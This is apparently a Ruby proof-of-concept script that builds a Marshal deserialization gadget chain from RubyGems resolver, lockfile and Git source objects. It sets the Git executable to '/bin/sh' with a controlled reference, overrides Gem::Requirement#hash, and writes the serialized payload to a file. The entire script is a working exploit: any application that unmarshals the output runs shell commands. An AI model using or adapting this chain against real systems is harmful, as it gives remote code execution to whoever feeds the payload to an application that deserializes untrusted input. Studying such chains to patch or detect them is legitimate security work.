require "rubygems/request_set"
require "rubygems/request_set/lockfile"
require "rubygems/resolver"
require "rubygems/source/git"

repository = "repo"
name = "poc"
root_dir = "/github/workspace/gadget-root"

source = Gem::Source::Git.allocate
source.instance_variable_set("@git", "/bin/sh")
source.instance_variable_set("@reference", "controlled")
source.instance_variable_set("@root_dir", root_dir)
source.instance_variable_set("@repository", repository)
source.instance_variable_set("@name", name)

basic_spec = Gem::Resolver::Specification.allocate
basic_spec.instance_variable_set("@name", "poc")
basic_spec.instance_variable_set("@version", Gem::Version.new("1"))
basic_spec.instance_variable_set("@platform", Gem::Platform::RUBY)
basic_spec.instance_variable_set("@dependencies", [])

git_spec = Gem::Resolver::GitSpecification.allocate
git_spec.instance_variable_set("@source", source)
git_spec.instance_variable_set("@spec", basic_spec)

request = Gem::Resolver::SpecSpecification.allocate
request.instance_variable_set("@spec", git_spec)

request_set = Gem::RequestSet.allocate
request_set.instance_variable_set("@sorted_requests", [request])

lockfile = Gem::RequestSet::Lockfile.allocate
lockfile.instance_variable_set("@set", request_set)
lockfile.instance_variable_set("@dependencies", {})

requirement = Gem::Requirement.allocate
requirement.instance_variable_set("@requirements", [["~>", lockfile]])

class Gem::Requirement
  def hash
    0
  end
end

File.binwrite(ARGV.fetch(0), Marshal.dump({ requirement => "trigger" }))
